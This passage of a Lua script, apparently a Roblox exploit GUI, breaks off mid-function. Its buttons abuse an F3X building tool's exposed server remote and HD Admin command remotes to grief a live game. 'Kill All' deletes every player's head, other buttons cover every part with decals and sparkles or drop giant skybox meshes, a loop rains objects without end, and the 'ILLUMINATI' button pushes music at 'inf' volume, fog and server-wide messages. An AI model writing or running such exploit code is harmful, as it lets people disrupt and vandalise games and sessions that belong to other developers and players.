f3x.Position = UDim2.new(0.187, 0,0.143, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skybox 3"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("105669801186198")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.325, 0,0.142, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Kill All"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end

	if not tool then
		warn("F3X tool not found!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function invokeRemote(args)
		remote:InvokeServer(unpack(args))
	end

	local function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		invokeRemote(args)
	end

	local function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		invokeRemote(args)
	end

	local function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		invokeRemote(args)
	end

	local function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		invokeRemote(args)
	end

	local function MovePart(part, cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		invokeRemote(args)
	end

	local function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		invokeRemote(args)
	end

	local function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		invokeRemote(args)
	end

	local function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		invokeRemote(args)
	end

	local function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
		}
		invokeRemote(args)
	end

	local function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}
		invokeRemote(args)
	end

	local function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		invokeRemote(args)
	end

	local function Weld(part1, part2, lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		invokeRemote(args)
	end

	local function SetLocked(part, boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		invokeRemote(args)
	end

	local function SetTrans(part, int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		invokeRemote(args)
	end

	local function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		invokeRemote(args)
	end

	local function SyncLighting(part, brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		invokeRemote(args)
	end

	local function KillAll()
		for _, v in game.Players:GetPlayers() do
			spawn(function()
				if v.Character and v.Character:FindFirstChild("Head") then
					SetLocked(v.Character.Head, false)
					DestroyPart(v.Character.Head)
				end
			end)
		end
	end

	KillAll()

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.467, 0,0.143, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Sparkles all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end

	if not tool then
		warn("F3X tool not found!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function invokeRemote(args)
		remote:InvokeServer(unpack(args))
	end

	local function AddSparkles(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Sparkles"
				}
			}
		}
		invokeRemote(args)
	end

	local function SparklesParts()
		for _, v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") then
				task.spawn(function()
					AddSparkles(v)
				end)
			end
		end
	end

	SparklesParts()

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.611, 0,0.141, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "ILLUMINATI"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 1383446402")
	RequestCommand:InvokeServer(";volume inf")
	task.wait(9)
	RequestCommand:InvokeServer(";music 127858584011239")
	RequestCommand:InvokeServer(";volume inf")
	task.wait(4)
	RequestCommand:InvokeServer(";disco")
	RequestCommand:InvokeServer(";fog 10000 10000")
	RequestCommand:InvokeServer(";serverMessage ILLUMINATI CONFIRMED?")
	task.wait(2)
	RequestCommand:InvokeServer(";serverMessage ILLUMINATI THEORY IS TRUE?")
	task.wait(4)
	RequestCommand:InvokeServer(";serverMessage ILLUMINATI CONFIRMED?")
	task.wait(2)
	RequestCommand:InvokeServer(";serverMessage ILLUMINATI THEORY IS TRUE?")
end)
f3x.MouseButton1Click:Connect(function()
	task.wait(14)
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("719516751")

	-----------------------------------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("217185480")

	-----------
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	-- DO NOT DELETE THIS LEAVE MY CREDIT

	-- Rain Toad Script By ItsKittyyyGD 

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}
		_(args)
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			wait(0.001) -- Here they change the appearance time of the Toads or other meshes
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + 400

				spawn(function()
					local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
					for i, v in game.Workspace:GetDescendants() do
						if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
							SetName(v, "ILLUMINATI CONFIRMED?????") -- Here the name of the toad changes
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(1, 1, 1), v.CFrame)
							MeshResize(v, Vector3.new(200, 200, 200))
							SetMesh(v, "111891702759441") -- Here put it A custom mesh
							SetTexture(v, "595096727") -- X2
							SetCollision(v, true)
							v.Orientation = Vector3.new(0, 0, 0)

							v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://250299736" -- Here the noise or another sound To the toads or other things It works when they appear 
							sound.Volume = 1
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()

	Sky("719516751") -- Here they change the skybox id 
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.762, 0,0.141, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Toad Rain"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}
		_(args)
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "111891702759441")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(8000, 8000, 8000))
			end
		end
	end

	local function createRainToads()
		while true do
			wait(0.3)
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + 800  

				spawn(function()
					local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace)
					for i, v in game.Workspace:GetDescendants() do
						if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
							SetName(v, "MiniToad")
							SetAnchor(false, v)
							AddMesh(v)

							SetMesh(v, "7234998844")
							SetTexture(v, "1009824086")
							SetCollision(v, false)
							v.Orientation = Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://153752123"
							sound.Volume = 10
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.047, 0,0.175, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "666"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame


f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
